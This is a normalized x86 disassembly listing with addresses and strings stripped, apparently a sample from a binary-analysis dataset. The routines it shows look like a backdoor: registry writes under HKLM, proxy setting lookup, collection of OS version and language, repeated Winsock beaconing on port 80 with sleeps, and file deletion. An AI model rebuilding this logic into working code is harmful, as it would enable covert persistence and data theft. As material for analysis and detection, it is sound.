sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_406130
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_401080
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push sub_4041f0
push 0x0
push 0x0
call [ CreateThread@IAT ]
call sub_401200
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
call sub_402300
sub_401080
push esi
push edi
push 0x6
push rw-data
call sub_402b70
push 0x8
push rw-data
call sub_402b70
push 0x22
push rw-data
call sub_402b70
push 0x8
push rw-data
call sub_402b70
push 0x8
push rw-data
call sub_402b70
push 0x8
push rw-data
call sub_402b70
push 0xa
push rw-data
call sub_402b70
push 0xd
push rw-data
call sub_402b70
add esp 0x40
push 0x8
push rw-data
call sub_402b70
push 0xf
push rw-data
call sub_402b70
push 0xe
push rw-data
call sub_402b70
push 0xe
push rw-data
call sub_402b70
push 0x9
push rw-data
call sub_402b70
push 0xf
push rw-data
call sub_402b70
push 0xd
push rw-data
call sub_402b70
push 0x11
push rw-data
call sub_402b70
add esp 0x40
push 0xa
push rw-data
call sub_402b70
push 0xc
push rw-data
call sub_402b70
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_402b70
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0xd
push rw-data
call sub_402b70
push 0xb
push rw-data
call sub_402b70
push 0x14
push rw-data
call sub_402b70
push 0xb
push rw-data
call sub_402b70
push 0x15
push rw-data
call sub_402b70
add esp 0x40
push 0xb
push rw-data
call sub_402b70
add esp 0x8
pop edi
pop esi
retn
sub_401200
push esi
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_401640
test eax eax
jne r-xdata
push rw-data
call sub_401800
call sub_401840
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
call sub_4017e0
call sub_402ba0
call sub_4021b0
call sub_4022b0
call sub_4022d0
mov esi [ malloc@IAT ]
push 0x2000
call esi
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0x2000
call esi
add esp 0x4
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
pop edi
mov eax ecx
pop esi
retn
pop edi
pop esi
retn
sub_401660
sub esp 0x88
push ebx
push ebp
push esi
xor esi esi
lea eax [ esp + 0xc ]
push esi
mov ebp [ RegCreateKeyExA@IAT ]
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x34 ] 0x80
call ebp
mov eax [ esp + 0xc ]
mov ebx [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call ebx
test eax eax
jne r-xdata
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov al [ esp + 0x14 ]
test al al
je r-xdata
mov edx [ esp + 0xc ]
mov [ esp + eax + 0x14 ] 0x0
mov eax [ esp + 0x10 ]
mov esi [ RegSetValueExA@IAT ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x1
push 0x0
push rw-data
push edx
call esi
lea eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
call ebp
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push 0x0
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
inc cl
mov [ esp + eax + 0x14 ] cl
mov cl [ eax + rw-data ]
inc eax
test cl cl
jne r-xdata
mov [ esi + rw-data ] 0x0
jmp r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0x15 ]
inc esi
test al al
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
test eax eax
je r-xdata
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
push 0x4
push rw-data
mov [ rw-data ] eax
mov eax [ esp + 0x14 ]
push 0x4
push 0x0
push rw-data
push eax
call esi
mov cl [ rw-data ]
xor eax eax
test cl cl
je r-xdata
add esp 0x88
retn
push eax
call [ RegCloseKey@IAT ]
sub_401800
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx 0x27
xor eax eax
mov edi esi
[ edi ]
mov edi [ GetVersionExA@IAT ]
push esi
mov [ esi ] 0x9c
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_401840
sub esp 0x108
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x1
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x20 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x108
retn
mov edx [ esp + 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push eax
push eax
push rw-data
push edx
call esi
mov edx [ esp + 0x8 ]
mov edi eax
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push 0x0
push rw-data
push edx
mov [ esp + 0x24 ] 0x100
call esi
mov esi eax
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ strstr@IAT ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
lea edi [ esp + 0x10 ]
add edi 0x5
jmp r-xdata
push 0x3a
push edi
call [ strchr@IAT ]
mov edx eax
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
inc edx
[ edi ] [ esi ]
push edx
call [ atoi@IAT ]
add esp 0xc
mov [ rw-data ] eax
mov eax 0x1
pop edi
pop esi
add esp 0x108
retn
sub_401950
mov eax 0x2120
call sub_405ed0
mov eax [ esp + 0x2124 ]
push ebx
push ebp
push esi
push edi
push eax
call sub_402c60
mov edi [ Ordinal_WSOCK32_10@IAT ]
add esp 0x4
push eax
call edi
mov ebp [ esp + 0x2138 ]
push 0x0
push 0x1
push 0x2
mov esi eax
call [ Ordinal_WSOCK32_23@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2120
retn
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x1
push ecx
push 0x8004667e
push ebx
call [ Ordinal_WSOCK32_12@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x3c
test eax eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x1
je r-xdata
push ebp
mov [ esp + 0x20 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
lea edx [ esp + 0x1c ]
push 0x10
push edx
push ebx
mov [ esp + 0x2a ] ax
mov [ esp + 0x2c ] esi
call [ Ordinal_WSOCK32_4@IAT ]
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
push 0x0
lea eax [ ebx + 0x1 ]
push edx
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push rw-data
call edi
mov ebp [ rw-data ]
mov esi eax
push ebx
mov eax [ esp + 0x2150 ]
mov ebp [ esp + 0x2144 ]
cmp eax 0x1
push ebp
jne r-xdata
mov ecx [ esp + 0x2140 ]
mov edx [ esp + 0x213c ]
push eax
mov eax [ esp + 0x213c ]
push ecx
push edx
lea ecx [ esp + 0x140 ]
push eax
push ecx
call sub_4024e0
mov eax [ esp + 0x2140 ]
mov ecx [ esp + 0x213c ]
mov edx [ esp + 0x2138 ]
push 0x1
push eax
push ecx
lea eax [ esp + 0x140 ]
push edx
push eax
call sub_4027a0
jmp r-xdata
push ebx
call sub_402a60
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
push 0x0
push edx
lea eax [ ebx + 0x1 ]
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
push ebx
jle r-xdata
lea edi [ esp + 0x148 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
mov esi [ esp + 0x2140 ]
dec ecx
mov eax ecx
mov ecx ebp
mov edx ecx
push 0x0
lea edi [ esp + eax + 0x134 ]
add eax ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
lea eax [ esp + 0x138 ]
and ecx 0x3
push eax
push ebx
[ edi ] [ esi ]
call [ Ordinal_WSOCK32_19@IAT ]
cmp [ esp + 0x2150 ] 0x1
jne r-xdata
cmp eax 0x3e800
jge r-xdata
call [ Ordinal_WSOCK32_3@IAT ]
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2120
retn
mov edi [ esp + 0x2148 ]
mov ebp [ Ordinal_WSOCK32_16@IAT ]
xor esi esi
mov edx 0x3e800
push 0x0
sub edx esi
lea eax [ esi + edi ]
push edx
push eax
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push ebx
call [ Ordinal_WSOCK32_3@IAT ]
mov ecx [ esp + 0x214c ]
pop edi
mov eax 0x1
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x2120
retn
add esi eax
cmp esi 0x3e800
jl r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push eax
push 0x0
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_401bb0
sub esp 0x80
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401950
add esp 0x20
test eax eax
jne r-xdata
pop esi
add esp 0x80
retn
mov ecx [ esi ]
xor edx edx
mov [ rw-data ] ecx
mov dx [ esi + 0x4 ]
xor eax eax
mov [ rw-data ] edx
mov ax [ esi + 0x6 ]
push esi
mov [ rw-data ] eax
call [ free@IAT ]
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
mov eax 0x1
pop esi
add esp 0x80
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
add esp 0x80
retn
sub_401c60
sub esp 0x588
push 0x3e800
call [ malloc@IAT ]
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x19d ]
[ edi ]
not ecx
sub edi ecx
mov ebp [ sprintf@IAT ]
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
add ebx 0x6
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x198 ]
mov eax ecx
mov esi edi
mov edi edx
mov edx [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi rw-data
lea ebx [ ebx + ecx + 0x1 ]
mov ecx 0x27
lea edi [ esp + ebx + 0x198 ]
add ebx 0x9c
[ edi ] [ esi ]
mov cx [ rw-data ]
lea edi [ esp + 0x23 ]
mov [ esp + ebx + 0x198 ] cx
mov ecx [ rw-data ]
add ebx 0x2
test edx edx
setne al
mov [ esp + ebx + 0x198 ] al
mov eax [ rw-data ]
inc ebx
mov [ esp + 0x18 ] eax
mov ax [ rw-data ]
mov [ esp + ebx + 0x198 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x1c ] ecx
mov cl [ rw-data ]
mov [ esp + 0x20 ] ax
mov [ esp + 0x22 ] cl
mov ecx 0x1d
xor eax eax
[ edi ]
add ebx 0x4
test edx edx
stosb [ edi ]
je r-xdata
add esp 0x588
retn
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x98 ]
push ecx
push rw-data
push rw-data
push edx
call ebp
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x198 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
call [ GetTickCount@IAT ]
xor edx edx
mov esi 0x36ee80
mov ecx eax
div esi
mov eax 0x45e7b273
mul edx
shr edx 0xe
mov eax 0x95217cb1
push edx
mul ecx
shr edx 0x15
push edx
lea ecx [ esp + 0xa0 ]
push rw-data
push ecx
call ebp
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x1a8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xa8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
lea ebx [ ebx + ecx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push 0x2f
[ edi ] [ esi ]
lea ecx [ esp + 0xac ]
push ecx
call [ strrchr@IAT ]
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
lea ebp [ esp + ebx + 0x198 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
mov edx [ rw-data ]
lea eax [ esp + 0x18 ]
push edx
push rw-data
push rw-data
push eax
call ebp
add esp 0x10
mov edi [ esp + 0x10 ]
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push 0x1
push eax
mov eax [ rw-data ]
push edi
lea ecx [ esp + 0x1a4 ]
push ebx
push ecx
push rw-data
push edx
push eax
mov [ esp + 0x1b8 ] 0x30
mov [ esp + 0x1b9 ] ebx
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_401950
push edi
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x588
retn
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x98 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx ebx
lea ebx [ ecx + edx + 0x1 ]
sub_401f90
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401950
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
push edi
push ecx
push esi
call sub_402000
push esi
mov edi eax
call [ free@IAT ]
add esp 0xc
mov eax edi
pop edi
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_402000
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebp ebp
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
add ecx ebp
pop esi
pop ebp
pop ebx
mov ecx [ ecx + edx + 0x1 ]
mov edx [ rw-data ]
cmp ecx edx
sete al
retn
inc ebp
cmp ebp edi
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
lea eax [ edx + ebp ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_402080
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
lea edi [ ebx + ebx * 4 + 0x3a98 ]
xor esi esi
shl edi 0x1
call [ GetTickCount@IAT ]
test ebx ebx
mov [ rw-data ] eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov eax ebx
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ Ordinal_WSOCK32_19@IAT ]
cmp eax 0xffffffff
jne r-xdata
add esi eax
mov eax ebx
sub eax esi
add eax 0xbb8
lea edi [ eax + eax * 4 ]
shl edi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax edi
dec edi
test eax eax
je r-xdata
jmp r-xdata
cmp esi ebx
jl r-xdata
sub_402120
sub esp 0x200
mov edx [ rw-data ]
mov ecx 0x80
xor eax eax
push esi
mov esi [ esp + 0x208 ]
push edi
lea edi [ esp + 0x8 ]
[ edi ]
mov eax [ esi + 0x1 ]
mov ecx [ rw-data ]
push eax
push 0x1
push rw-data
push ecx
push edx
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_4024e0
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push ecx
call sub_402080
add esp 0x20
test eax eax
jne r-xdata
mov edx [ esp + 0x210 ]
push edx
push esi
call sub_402080
add esp 0x8
pop edi
pop esi
add esp 0x200
retn
pop edi
pop esi
add esp 0x200
retn
sub_4021b0
push ecx
push ebx
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop ebx
pop ecx
retn
push esi
xor esi esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
push ebx
call [ free@IAT ]
add esp 0x4
pop esi
inc esi
cmp esi 0x3
jl r-xdata
lea eax [ esp + 0x8 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401950
add esp 0x20
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
pop esi
pop ebx
pop ecx
retn
sub_402270
push rw-data
call sub_405660
add esp 0x4
test eax eax
jne r-xdata
push rw-data
call sub_405390
add esp 0x4
test eax eax
jne r-xdata
retn
push rw-data
push rw-data
call sub_4054b0
add esp 0x8
retn
retn
sub_402300
sub esp 0x10c
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ SHGetSpecialFolderPathA@IAT ]
xor ebx ebx
push edi
push ebx
push 0x2
push eax
push ebx
call esi
mov edi [ sprintf@IAT ]
push rw-data
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
lea edx [ esp + 0x24 ]
push rw-data
push edx
call edi
mov ebp [ DeleteFileA@IAT ]
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push ebx
lea ecx [ esp + 0x1c ]
push 0x2
push ecx
push ebx
call esi
push rw-data
lea edx [ esp + 0x1c ]
push rw-data
push edx
lea eax [ esp + 0x24 ]
push rw-data
push eax
call edi
add esp 0x14
lea ecx [ esp + 0x18 ]
push ecx
call ebp
push ebx
lea edx [ esp + 0x1c ]
push 0x2
push edx
push ebx
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call edi
add esp 0x14
lea edx [ esp + 0x18 ]
push edx
call ebp
push ebx
lea eax [ esp + 0x1c ]
push 0x2
push eax
push ebx
call esi
push rw-data
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
lea edx [ esp + 0x24 ]
push rw-data
push edx
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
mov esi [ Sleep@IAT ]
mov ebp [ Ordinal_WSOCK32_12@IAT ]
mov edi 0x1
mov [ rw-data ] edi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call esi
call sub_402240
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_401bb0
test eax eax
jne r-xdata
call sub_402270
call sub_401c60
test eax eax
jne r-xdata
push 0x249f0
call esi
jmp r-xdata
call sub_401f90
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_402c90
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x8004667e
push edx
mov [ esp + 0x1c ] edi
call ebp
